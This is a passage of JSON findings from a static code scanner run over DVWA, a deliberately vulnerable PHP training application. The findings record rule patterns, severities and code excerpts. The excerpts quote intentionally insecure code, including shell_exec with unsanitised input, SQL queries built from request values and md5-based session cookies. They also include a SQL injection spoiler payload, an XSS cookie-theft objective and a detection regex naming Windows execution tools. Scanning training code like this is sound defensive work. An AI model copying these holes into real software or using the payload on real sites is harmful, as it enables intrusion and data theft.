        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 14,
        "startLocationColumn": 10,
        "endLocationLine": 14,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 10,
        "startLocationColumn": 4,
        "endLocationLine": 10,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 14,
        "startLocationColumn": 4,
        "endLocationLine": 14,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n\n?&gt;\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 19,
        "endLocationLine": 18,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/help/help.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "Broke",
        "excerpt": "\n\t&lt;/div&gt;\n\n\t&lt;p&gt;Reference: &lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management&#39; ); ?&gt;&lt;/p&gt;\n&lt;/div&gt;\n\n",
        "startLocationLine": 38,
        "startLocationColumn": 99,
        "endLocationLine": 38,
        "endLocationColumn": 104
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/source/high.php",
        "ruleId": "DH000004",
        "ruleName": "Manual mandatory",
        "ruleDescription": "Manual review mandatory",
        "pattern": "\\b(HIT_ME_RISK_MANUAL_MANDATED)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Manual.mandatory"
        ],
        "sample": "HIT_ME_RISK_MANUAL_MANDATED",
        "excerpt": "&lt;?php\n//HIT_ME_RISK_MANUAL_MANDATED\n$html = &quot;&quot;;\n\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) {\n\tif (!isset ($_SESSION[&#39;last_session_id_high&#39;])) {\n\t\t$_SESSION[&#39;last_session_id_high&#39;] = 0;\n",
        "startLocationLine": 2,
        "startLocationColumn": 3,
        "endLocationLine": 2,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/source/high.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\t$_SESSION[&#39;last_session_id_high&#39;] = 0;\n\t}\n\t$_SESSION[&#39;last_session_id_high&#39;]++;\n\t$cookie_value = md5($_SESSION[&#39;last_session_id_high&#39;]);\n\tsetcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], false, false);\n}\n\n?&gt;\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 18,
        "endLocationLine": 10,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "sha1",
        "excerpt": "$html = &quot;&quot;;\n\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) {\n\t$cookie_value = sha1(mt_rand() . time() . &quot;Impossible&quot;);\n\tsetcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], true, true);\n}\n?&gt;\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 18,
        "endLocationLine": 6,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/source/medium.php",
        "ruleId": "DH000004",
        "ruleName": "Manual mandatory",
        "ruleDescription": "Manual review mandatory",
        "pattern": "\\b(HIT_ME_RISK_MANUAL_MANDATED)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Manual.mandatory"
        ],
        "sample": "HIT_ME_RISK_MANUAL_MANDATED",
        "excerpt": "&lt;?php\n//HIT_ME_RISK_MANUAL_MANDATED\n$html = &quot;&quot;;\n\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) {\n\t$cookie_value = time();\n\tsetcookie(&quot;dvwaSession&quot;, $cookie_value);\n",
        "startLocationLine": 2,
        "startLocationColumn": 3,
        "endLocationLine": 2,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/source/low.php",
        "ruleId": "DH000004",
        "ruleName": "Manual mandatory",
        "ruleDescription": "Manual review mandatory",
        "pattern": "\\b(HIT_ME_RISK_MANUAL_MANDATED)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Manual.mandatory"
        ],
        "sample": "HIT_ME_RISK_MANUAL_MANDATED",
        "excerpt": "&lt;?php\n//HIT_ME_RISK_MANUAL_MANDATED\n$html = &quot;&quot;;\n\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) {\n\tif (!isset ($_SESSION[&#39;last_session_id&#39;])) {\n\t\t$_SESSION[&#39;last_session_id&#39;] = 0;\n",
        "startLocationLine": 2,
        "startLocationColumn": 3,
        "endLocationLine": 2,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/help/help.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The medium level uses a form of SQL injection protection, with the function of\n\t\t\t&quot;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://secure.php.net/manual/en/function.mysql-real-escape-string.php&#39;, &#39;mysql_real_escape_string()&#39; ); ?&gt;&quot;.\n\t\t\tHowever due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered.&lt;/p&gt;\n\n\t\t&lt;p&gt;The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?id=a UNION SELECT 1,2;-- -&amp;Submit=Submit&lt;/span&gt;.&lt;/pre&gt;\n\n",
        "startLocationLine": 33,
        "startLocationColumn": 83,
        "endLocationLine": 33,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/high.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t$last  = $row[&quot;last_name&quot;];\n\n\t\t// Feedback for end user\n\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 59,
        "endLocationLine": 18,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;",
        "excerpt": "\t$id = $_SESSION[ &#39;id&#39; ];\n\n\t// Check database\n\t$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; );\n\n\t// Get results\n\twhile( $row = mysqli_fetch_assoc( $result ) ) {\n\t\t// Get values\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/impossible.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t\t$last  = $row[ &#39;last_name&#39; ];\n\n\t\t\t// Feedback for end user\n\t\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t\t}\n\t}\n}\n\n// Generate Anti-CSRF token\n",
        "startLocationLine": 25,
        "startLocationColumn": 60,
        "endLocationLine": 25,
        "endLocationColumn": 67
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );",
        "excerpt": "\t// Was a number entered?\n\tif(is_numeric( $id )) {\n\t\t// Check the database\n\t\t$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );\n\t\t$data-&gt;execute();\n\t\t$row = $data-&gt;fetch();\n\n\t\t// Make sure only 1 result is returned\n",
        "startLocationLine": 13,
        "startLocationColumn": 25,
        "endLocationLine": 13,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/medium.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t$last  = $row[&quot;last_name&quot;];\n\n\t\t// Feedback for end user\n\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t}\n\n}\n\n// This is used later on in the index.php page\n",
        "startLocationLine": 19,
        "startLocationColumn": 59,
        "endLocationLine": 19,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;",
        "excerpt": "\n\t$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);\n\n\t$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; );\n\n\t// Get results\n\twhile( $row = mysqli_fetch_assoc( $result ) ) {\n\t\t// Display values\n",
        "startLocationLine": 9,
        "startLocationColumn": 12,
        "endLocationLine": 9,
        "endLocationColumn": 76
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT COUNT(*) FROM users;&quot;;",
        "excerpt": "\n// This is used later on in the index.php page\n// Setting it here so we can close the database connection in here like in the rest of the source scripts\n$query  = &quot;SELECT COUNT(*) FROM users;&quot;;\n$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n$number_of_rows = mysqli_fetch_row( $result )[0];\n\nmysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);\n?&gt;\n",
        "startLocationLine": 26,
        "startLocationColumn": 11,
        "endLocationLine": 26,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/low.php",
        "ruleId": "AI016200",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "(first|last|sur)name",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "Surname",
        "excerpt": "\t\t$last  = $row[&quot;last_name&quot;];\n\n\t\t// Feedback for end user\n\t\t$html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;\n\t}\n\n\tmysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);\n}\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 59,
        "endLocationLine": 18,
        "endLocationColumn": 66
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;",
        "excerpt": "\t$id = $_REQUEST[ &#39;id&#39; ];\n\n\t// Check database\n\t$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t// Get results\n\twhile( $row = mysqli_fetch_assoc( $result ) ) {\n\t\t// Get values\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/source/low.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "}\n$page[ &#39;body&#39; ] .= &#39;\n&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;\n\t&lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;\n\t&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;\n\t&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;\n&lt;/form&gt;\n&#39;;\n\n",
        "startLocationLine": 18,
        "startLocationColumn": 13,
        "endLocationLine": 18,
        "endLocationColumn": 124
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_r/help/help.php",
        "ruleId": "AI016400",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "email",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "email",
        "excerpt": "\t\t\tand will execute the JavaScript. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other\n\t\t\tsensitive information retained by your browser and used with that site. These scripts can even rewrite the content of the HTML page.&lt;/p&gt;\n\n\t\t&lt;p&gt;Because its a reflected XSS, the malicious code is not stored in the remote web application, so requires some social engineering (such as a link via email/chat).&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;One way or another, steal the cookie of a logged in user.&lt;/p&gt;\n",
        "startLocationLine": 18,
        "startLocationColumn": 155,
        "endLocationLine": 18,
        "endLocationColumn": 160
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI016700",
        "ruleName": "Data: Sensitive (Account)",
        "ruleDescription": "Data: Sensitive (Account)",
        "pattern": "\\b(registration|membership|acctnum|accountnum|accountnumber)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.UserAccount"
        ],
        "sample": "registration",
        "excerpt": "\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;A &lt;?php echo dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/CAPTCHA&#39;, &#39;CAPTCHA&#39; ); ?&gt; is a program that can tell whether its user is a human or a computer. You&#39;ve probably seen\n\t\t\tthem - colourful images with distorted text at the bottom of Web registration forms. CAPTCHAs are used by many websites to prevent abuse from\n\t\t\t&quot;bots&quot;, or automated programs usually written to generate spam. No computer program can read distorted text as well as humans can, so bots\n\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n",
        "startLocationLine": 10,
        "startLocationColumn": 69,
        "endLocationLine": 10,
        "endLocationColumn": 81
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI016700",
        "ruleName": "Data: Sensitive (Account)",
        "ruleDescription": "Data: Sensitive (Account)",
        "pattern": "\\b(registration|membership|acctnum|accountnum|accountnumber)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.UserAccount"
        ],
        "sample": "registration",
        "excerpt": "\t\t\t&quot;bots&quot;, or automated programs usually written to generate spam. No computer program can read distorted text as well as humans can, so bots\n\t\t\tcannot navigate sites protected by CAPTCHAs.&lt;/p&gt;\n\n\t\t&lt;p&gt;CAPTCHAs are often used to protect sensitive functionality from automated bots. Such functionality typically includes user registration and changes,\n\t\t\tpassword changes, and posting content. In this example, the CAPTCHA is guarding the change password functionality for the user account. This provides\n\t\t\tlimited protection from CSRF attacks as well as automated bot guessing.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n",
        "startLocationLine": 14,
        "startLocationColumn": 129,
        "endLocationLine": 14,
        "endLocationColumn": 141
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "&lt;div class=&quot;body_padded&quot;&gt;\n\t&lt;h1&gt;Help - Insecure CAPTCHA&lt;/h1&gt;\n\n\t&lt;div id=&quot;code&quot;&gt;\n\t&lt;table width=&#39;100%&#39; bgcolor=&#39;white&#39; style=&quot;border:2px #C0C0C0 solid&quot;&gt;\n\t&lt;tr&gt;\n\t&lt;td&gt;&lt;div id=&quot;code&quot;&gt;\n",
        "startLocationLine": 2,
        "startLocationColumn": 13,
        "endLocationLine": 2,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\tif (\n\t\t$resp ||\n",
        "startLocationLine": 13,
        "startLocationColumn": 22,
        "endLocationLine": 13,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;",
        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\n",
        "startLocationLine": 30,
        "startLocationColumn": 14,
        "endLocationLine": 30,
        "endLocationColumn": 109
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/high.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
